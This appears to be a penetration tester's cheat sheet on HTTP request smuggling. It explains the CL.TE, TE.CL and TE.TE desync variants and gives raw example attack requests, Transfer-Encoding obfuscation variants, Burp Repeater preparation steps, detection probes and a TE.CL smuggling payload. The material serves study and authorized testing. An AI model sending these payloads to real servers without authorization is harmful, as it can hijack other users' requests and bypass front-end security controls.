# Info
### Request smuggling is primarily associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable

###### The Content-Length header is straightforward: it specifies the length of the message body in bytes
###### The Transfer-Encoding header can be used to specify that the message body uses chunked encoding. This means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in hexadecimal), followed by a newline, followed by the chunk contents.

#### CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
#### TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
#### TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way. 

### CL.TE vulnerabilities
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

### TE.CL vulnerabilities
###### To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked. You need to include the trailing sequence \r\n\r\n following the final 0.
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
### TE.TE behavior: obfuscating the TE header
###### Here, the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```
# Testing
### Prep
```
1. Downgrade HTTP protocol to HTTP/1.1
2. Change request method to POST
3. Disable automatic update of Content-Length
4. Show non-printable characters
5. Send request as a sanity check
```
### Detection
##### CL.TE = Timeout (backend)
##### TE.CL/TE.TE = Reject/Invalid (frontend)
##### CL.CL = Response (backend)
```
Content-Length: 6
Transfer-Encoding: chunked

3\r\n
abc\r\n
X\r\n
\r\n
```
### TE.CL payload
##### chunked encoding up to x=1
##### Content-Length always +1
```
Content-Length: 4
Transfer-Encoding: chunked

2d\r\n
POST /404 HTTP/1.1\r\n
Content-Length: 11
\r\n
x=1
0\r\n
\r\n
```
